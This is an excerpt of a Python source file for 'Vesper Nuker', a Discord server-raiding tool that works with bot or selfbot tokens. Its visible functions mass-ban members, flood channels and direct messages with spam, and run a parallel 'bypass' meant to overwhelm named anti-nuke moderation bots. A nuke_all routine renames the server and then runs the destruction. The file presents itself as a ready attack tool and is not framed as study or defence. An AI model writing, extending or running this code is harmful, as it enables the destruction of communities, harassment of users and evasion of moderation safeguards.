#!/usr/bin/env python3
# VESPER NUKER v1.0
# terminal-driven discord nuke suite (bot / selfbot modes)
   ...
   \ \/ /   |  __|  `--. \|  __| |    / |  __| 
    \  /    | |___ /\__/ /| |___ | |\ \ | |___ 
     \/     \____/ \____/ \____/ \_| \_|\____/ 
            V E S P E R   N U K E R   v1.0
"""

API = "https://discord.com/api/v10"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Vesper/1.0"
...
class VesperNuker:
    def __init__(self, token, guild_id, is_bot):
        ...
        self.session = None
        self.sem = asyncio.Semaphore(15)  # concurrency throttle
    ...
    async def ban_member(self, uid, name):
        s, _ = await self._req("PUT", f"/guilds/{self.guild_id}/bans/{uid}", {"delete_message_seconds": 0})
        if s in (200, 201, 204):
    ...
    async def message_spam(self, message, count, channel_id=None):
        ...
        async def one(_):
            s, _ = await self._req("POST", f"/channels/{channel_id}/messages", {"content": message})
            if s in (200, 201):
    ...
    async def dm_spam(self, message, count):
        ...
        async def one(user):
            s, t = await self._req("POST", "/users/@me/channels", {"recipient_id": user["user"]["id"]})
            if s not in (200, 201):
                return
            try:
                ch = json.loads(t)["id"]
    ...
    async def bot_bypass_spam(self, message, per_channel):
        """Fire concurrent writes across every channel to overwhelm anti-nuke response."""
        ...
        # fire all channels in parallel — this is the actual "bypass"
    ...
    async def nuke_all(self, msg, count):
        ...
        # order matters: rename first, then paralellize destruction
...
{Fore.WHITE} [5]  {Fore.LIGHTRED_EX}Bot Bypass Spam  {Fore.LIGHTBLACK_EX}(zynrax/olympus/xireon)
